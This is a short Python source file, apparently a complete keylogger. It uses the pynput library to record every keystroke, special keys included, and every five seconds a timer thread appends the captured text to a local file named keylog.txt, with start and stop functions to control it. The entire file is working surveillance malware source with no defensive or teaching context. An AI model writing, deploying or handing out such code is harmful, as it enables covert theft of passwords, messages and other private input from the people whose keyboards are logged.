#!/usr/bin/python
import pynput.keyboard as p_kb
import threading
import time

typed              = ""
key_listner        = None
add_to_file_thread = None
flag_to_kill       = 0

def process_key(key):
    global typed
    try:
        typed += key.char
    except AttributeError:
        typed +="["+ str(key)+"]"
    if flag_to_kill == 1:
        return False

def add_to_file():
    global typed,add_to_file_thread,flag_to_kill
    with open('keylog.txt','a') as log:
        log.write(typed)
    typed = ""
    if flag_to_kill == 0:
        add_to_file_thread = threading.Timer(5,add_to_file)
        add_to_file_thread.start()

def start():
    global key_listner, add_to_file_thread
    key_listner = p_kb.Listener(on_press = process_key)
    key_listner.start()
    add_to_file()
    
def stop_thread():
    global flag_to_kill
    flag_to_kill = 1
